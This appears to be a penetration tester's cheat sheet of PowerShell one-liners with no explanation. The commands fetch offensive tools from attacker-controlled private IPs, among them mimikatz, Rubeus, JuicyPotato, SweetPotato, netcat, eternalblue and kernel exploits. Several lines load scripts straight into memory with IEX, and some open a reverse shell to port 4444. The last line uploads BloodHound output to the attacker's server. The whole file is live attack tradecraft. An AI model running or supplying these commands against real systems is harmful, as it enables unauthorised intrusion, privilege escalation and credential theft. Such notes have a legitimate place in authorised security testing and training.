powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.154/SweetPotato.exe', 'SweetPotato.exe')
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.75/nc.exe', 'nc.exe')
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.75:8080/nc.exe', 'nc.exe')
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.75:8000/SweetPotato.exe', 'SweetPotato.exe')
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.154:81/mimikatz.exe', 'mimikatz.exe')
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.154/Rubeus.exe', 'Rubeus.exe')
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.154/chisel.exe', 'chisel.exe')

powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.75/accesschk64.exe', 'accesschk64.exe')
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.75:8000//JuicyPotato.exe', 'JuicyPotato.exe')
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.75:8000/eternalblue.exe', 'eternalblue.exe')
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.75:8000/ms11-046.exe', 'ms11-046.exe')
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.75:8000/ms15-051x64.exe', 'ms15-051x64.exe')


powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.154/PrivescCheck.ps1', 'PrivescCheck.ps1')
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.75/PrivescCheck.ps1', 'PrivescCheck.ps1')
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.75:8000/Sherlock.ps1', 'Sherlock.ps1')

powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.75:8000/winPEASx64.exe', 'winPEASx64.exe')

powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.10.44.141:81/images/winPEASx64.exe', 'winPEASx64.exe')

powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.45.205/windows-privesc-check2.exe', 'windows-privesc-check2.exe')

powershell.exe IEX (New-object System.Net.Webclient).Downloadstring('http://192.168.119.169/Invoke-Kerberoast.ps1')
powershell.exe IEX (New-object System.Net.Webclient).Downloadstring('http://10.10.14.75/PrivescCheck.ps1')
powershell.exe IEX (New-object System.Net.Webclient).Downloadstring('http://10.10.14.75:8000/Invoke-PowerShellTcp.ps1');Invoke-PowershellTcp -Reverse -IPAddress 10.10.14.75 -Port 4444
powershell.exe -NoProfile -ExecutionPolicy unrestricted IEX (New-object System.Net.Webclient).Downloadstring('http://10.10.14.75:8000/Invoke-PowerShellTcp.ps1')
powershell  -NoProfile -ExecutionPolicy unrestricted IEX (New-object System.Net.Webclient).Downloadstring('http://10.10.14.75:8000/Invoke-PowerShellTcp.ps1');Invoke-PowershellTcp -Reverse -IPAddress 10.10.14.75 -Port 4444


powershell.exe -NoProfile -ExecutionPolicy unrestricted IEX (New-object System.Net.Webclient).Downloadstring('http://10.10.14.75:8000/Sherlock.ps1')


Invoke-WebRequest -Uri "http://192.168.119.154/PowerView.ps1" -OutFile "PowerView.ps1"
Invoke-WebRequest -Uri "http://192.168.119.154:81/mimikatz.exe" -OutFile "mimikatz.exe"
Invoke-WebRequest -Uri "http://10.10.14.75/SharpHound.ps1" -OutFile "SharpHound.ps1"
Invoke-WebRequest -Uri "http://10.10.14.75/nc.exe" -OutFile "nc.exe"
Invoke-WebRequest -Uri "http://10.10.14.75/SweetPotato.exe" -OutFile "SweetPotato.exe"


Invoke-WebRequest -Uri "http://10.10.14.75/nc.exe" -OutFile "nc.exe"


powershell (New-object System.Net.WebClient).uploadFile('http://10.10.14.75/upload.php', '20230502030435_BloodHound.zip')s
